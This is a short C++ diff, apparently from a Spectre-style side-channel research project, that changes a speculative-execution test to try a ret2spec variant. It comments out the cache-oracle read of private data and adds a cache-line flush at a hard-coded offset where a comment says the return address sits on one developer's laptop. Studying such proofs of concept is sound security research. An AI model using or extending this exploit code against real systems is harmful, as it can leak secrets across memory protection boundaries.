@@ -82,16 +82,23 @@ void baz() {
 }
 
 bool bar() {
+  int stack_mark = 0xdeadbeef;
+  char *ptr = (char *)&stack_mark;
+
   // Mistrain the global BP to predict taken.
   for (int i = 0; i < 100; i++) {}
 
   if (cond == 0) {
     // This is copied here just to make sure speculation works.
     // For testing ret2spec, comment this out.
-    const std::array<BigByte, 256> &oracle = *oracle_ptr;
-    ForceRead(oracle.data() +
-      static_cast<unsigned char>(private_data[current_offset]));
+    // const std::array<BigByte, 256> &oracle = *oracle_ptr;
+    // ForceRead(oracle.data() +
+    //   static_cast<unsigned char>(private_data[current_offset]));
 
+    // Return address is consistently at stack_mark + 20 bytes
+    // on Jason's ThinkPad. Can't do FlushFromDataCache under
+    // speculation since it doesn't fit in the window.
+    FlushDataCacheLineNoBarrier(ptr + 20);
     return true;
   }
 
